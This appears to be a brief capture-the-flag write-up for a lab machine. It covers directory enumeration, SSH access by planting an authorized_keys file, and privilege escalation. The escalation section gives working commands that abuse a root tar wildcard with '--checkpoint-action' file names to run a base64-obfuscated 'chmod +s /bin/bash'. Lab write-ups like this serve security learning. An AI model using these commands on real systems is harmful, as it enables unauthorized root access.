## Enumeration

Using `feroxbuster` on port `33414`, we find `/info` and `/help`:

## Initial Access

The user `alfredo` has a `.ssh` folder and there is an SSH port open, so we can try to upload an `authorized_keys` file with a public key inside.

```bash
cat id_rsa.pub > authorized_keys.txt
```

## Privilege Escalation

Transfer `pspy` to the machine and we see a task executing.

We don't have permission to edit the script, but we see that `tar` is using a wildcard, so we can exploit that.

```bash
echo -n 'chmod +s /bin/bash' | base64
> Y2htb2QgK3MgL2Jpbi9iYXNo
touch -- "--checkpoint=1"
touch -- '--checkpoint-action=exec="echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash"'
```
